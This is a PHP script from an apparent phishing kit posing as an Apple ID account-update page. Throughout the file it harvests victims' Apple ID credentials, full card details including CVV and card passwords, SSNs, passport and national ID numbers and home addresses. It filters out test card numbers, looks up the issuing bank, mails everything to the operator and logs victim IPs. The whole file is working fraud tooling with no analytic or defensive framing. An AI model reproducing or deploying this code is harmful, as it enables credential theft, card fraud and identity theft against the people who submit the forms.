<?php
error_reporting(0);
session_start();
set_time_limit(0);
include '../main.php';
function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "jcb"       => "/^35[0-9]{14}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else if (preg_match($cardtype['jcb'],$number))
    {
	$type= "jcb";
        return 'jcb';
    }
    else
    {
        return false;
    } 
 }
$_SESSION['cart'] = $_POST['number'];
$_SESSION['expired'] = $_POST['expred'];
$_SESSION['cvv'] = $_POST['sdfs'];
$_SESSION['ccname'] = $_POST['cardname'];
$_SESSION['ccnumber'] = $_POST['number'];
$_SESSION['ccexpired'] = $_POST['expred'];
$_SESSION['cccvv'] = $_POST['sdfs'];
$_SESSION['date'] = $_POST['bith'];
$_SESSION['country'] = $_POST['cojjuntry'];
$_SESSION['firstname'] = $_POST['name1'];
$_SESSION['lastname'] = $_POST['name2'];
$_SESSION['cid'] = $_POST['cid'];

$_SESSION['idnumber'] = $_POST['idnumber'];
$_SESSION['qatarid'] = $_POST['qatarid'];
$_SESSION['civilid'] = $_POST['civilid'];
$_SESSION['nationalid'] = $_POST['nationalid'];
$_SESSION['citizenid'] = $_POST['citizenid'];
$_SESSION['passportnumber'] = $_POST['passportnumber'];
$_SESSION['cassn'] = $_POST['cassn'];
$_SESSION['ssn'] = $_POST['ssn'];
$_SESSION['acc_number'] = $_POST['acc_number'];
$_SESSION['osidnum'] = $_POST['osidnum'];

$_SESSION['phone'] = $_POST['phone'];
$_SESSION['cc_name'] = $_POST['cardname'];
$_SESSION['address1'] = $_POST['adre1'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['state'] = $_POST['state'];
$_SESSION['country'] = $_POST['cojjuntry'];
$_SESSION['zip'] = $_POST['zip'];
$_SESSION['dob'] = $_POST['bith'];
if($_POST['number'] == "") {
	exit();
}

$bin = $_POST['number'];
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$agent = $_SERVER['HTTP_USER_AGENT'];

$expirednya = $_POST['expred'];
$tahun = substr($expirednya,5,6);
$bulan = substr($expirednya,0,2);
if($bulan > 12) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    exit();
}
if($tahun < 20) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    exit();
}
$expirednya = "$bulan|$tahun";

$number = preg_replace('/\s/', '', $_POST['number']);
$message  = "########################### Mantuoluo ##########################\n";
$message .= "######################### LOGIN DETAILS #########################\n";
$message .= "🎉 Apple ID			: ".$_SESSION['email']."\n";
$message .= "🎉 Password			: ".$_SESSION['password']."\n";
$message .= "##################################################################\n";
$message .= "🎉 Bank			: ".$xBIN["bank"]["name"]."\n";
$message .= "🎉 Type			: ".strtoupper($xBIN["scheme"])." - ".strtoupper($xBIN["type"])."\n";
$message .= "🎉 Level			: ".strtoupper($xBIN["brand"])."\n";
$message .= "🎉 Cardholders    : ".$_POST['cardname']."\n";
$message .= "🎉 CC Number		: ".$_POST['number']."\n";
$message .= "🎉 Expired		: ".$_POST['expred']."\n";
$message .= "🎉 CVV			: ".$_POST['sdfs']."\n";
$message .= "🎉 AMEX CID 		: ".$_POST['cid']."\n";
$message .= "🎉 Sort Code		: ".$_POST['sortcode']."\n";
$message .= "🎉 Credit Limit	: ".$_POST['cc_limit']."\n";
$message .= "🎉 Copy			: ".$number."|".$expirednya."|".$_POST['sdfs']."\n";
$message .= "##################################################################\n";
$message .= "🎉 WEB ID						: ".$_POST['cardid']."\n";
$message .= "🎉 Card Password				: ".$_POST['vbv_jp']."\n";
$message .= "##################################################################\n";
$message .= "🎉 First Name		: ".$_POST['name1']."\n";
$message .= "🎉 Last Name		: ".$_POST['name2']."\n";
$message .= "🎉 Address		: ".$_POST['adre1']."\n";
$message .= "🎉 City			: ".$_POST['city']."\n";
$message .= "🎉 State			: ".$_POST['state']."\n";
$message .= "🎉 Country		: ".$_POST['cojjuntry']."\n";
$message .= "🎉 Zip			: ".$_POST['zip']."\n";
$message .= "🎉 BirthDay		: ".$_POST['bith']."\n";
$message .= "🎉 Phone			: ".$_POST['phone']."\n";
$message .= "##################################################################\n";
$message .= "🎉 ID Number					: ".$_POST['idnumber']."\n";
$message .= "🎉 Civil ID					: ".$_POST['civilid']."\n";
$message .= "🎉 Qatar ID					: ".$_POST['qatarid']."\n";
$message .= "🎉 National ID				: ".$_POST['nationalid']."\n";
$message .= "🎉 Citizen ID					: ".$_POST['citizenid']."\n";
$message .= "🎉 Passport Number			: ".$_POST['passportnumber']."\n";
$message .= "🎉 Bank Access Number         : ".$_POST['bankaccnumber']."\n";
$message .= "🎉 Social Insurance Number	: ".$_POST['cassn']."\n";
$message .= "🎉 Social Security Number		: ".$_POST['ssn']."\n";
$message .= "🎉 Account Number				: ".$_POST['acc_number']."\n";
$message .= "🎉 OSID Number				: ".$_POST['osidnum']."\n";
$message .= "##################################################################\n";
$message .= "🎉 IP Address		: ".$ip2."\n";
$message .= "🎉 Region		    : ".$regioncity."\n";
$message .= "🎉 City		    : ".$citykota."\n";
$message .= "🎉 Continent		: ".$continent."\n";
$message .= "🎉 Timezone		: ".$timezone."\n";
$message .= "🎉 OS/Browser		: ".$os." / ".$br."\n";
$message .= "🎉 Date			: ".$date."\n";
$message .= "🎉 User Agent		: ".$agent."\n";
$message .= "##################################################################\n";

$bin = $_POST['number'];
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,6);
$bin_1 = substr($bin,0,1);
validate();
// Validasi CC Valid tapi asal2an
if($number == '4111111111111111' or $number == '5500000000000004' or $number == '340000000000009' or $number == '6011000000000004' or $number == '3088000000000009') {
    echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    exit();
}

if($bin_1 == '1' or $bin_1 == '2' or $bin_1 == '7' or $bin_1 == '8' or $bin_1 == '9' or $bin_1 == '0') {
    echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    exit();
}

if($bin_1 == '4') {
	if(strlen($number) == '16') {
	}else{
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    	exit();
	}
}

if($bin_1 == '5') {
	if(strlen($number) == '16') {
	}else{
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    	exit();
	}
}

if($bin_1 == '6') {
	if(strlen($number) == '16') {
	}else{
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    	exit();
	}
}

if($bin_1 == '3') {
	if(strlen($number) >= '12') {
	}else{
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    	exit();
	}
}

$valid = validatecard($number);
if($valid == false) {
    echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    	exit();
  exit();
}

$_SESSION['bank_bin'] = $bin;
if($xBIN["brand"] == "") {
	$subject = "💳 NEW CC - ".$bin." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["bank"]["name"])." [ $cn - $os - $ip2 ]";
    $subbin = "💳 NEW CC - ".$bin." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["name"]);
}else{
	$subject = "💳 NEW CC - ".$bin." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["brand"])." ".strtoupper($xBIN["bank"]["name"])." [ $cn - $os - $ip2 ]";
    $subbin = "💳 NEW CC - ".$bin." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["brand"])." ".strtoupper($xBIN["bank"]["name"]);
}
if($number == $_SESSION['cc_numb']) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
		exit();
    	}else{
    		$_SESSION['cc_numb'] = preg_replace('/\s/', '', $_POST['number']);
}
$from = $_SESSION['firstname']." ".$_SESSION['lastname'];
if($from == $_SESSION['data_submit']) {
    }else{

        kirim_mail($to,$from,$subject,$message);
        $_SESSION['data_submit'] = $from;
        $click = fopen("../result/total_cc.txt","a");
		fwrite($click,"$ip2"."\n");
		fclose($click);
		$click = fopen("../result/total_bin.txt","a");
		fwrite($click,"$subbin|$countrycode|$cn|$os"."\n");
		fclose($click);
		$click = fopen("../result/log_visitor.txt","a");
		$jam = date("h:i:sa");
		fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Mengisi Credit Card"."\n");
		fclose($click);
}

if($double_cc == 'on') {
	if($_SESSION['cc_kedua'] == "") {
		$_SESSION['cc_kedua'] = "done";
		$_SESSION['data_submit'] = "";
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
		exit();
	}
}

if($get_bank == 'on' and $_SESSION['country'] == "United States") {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=bankus&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
	exit();
}else{
	if($getphoto == 'on') {
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=upload&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
		exit();
	}else{
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=done&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
		exit();
	}
}
?>
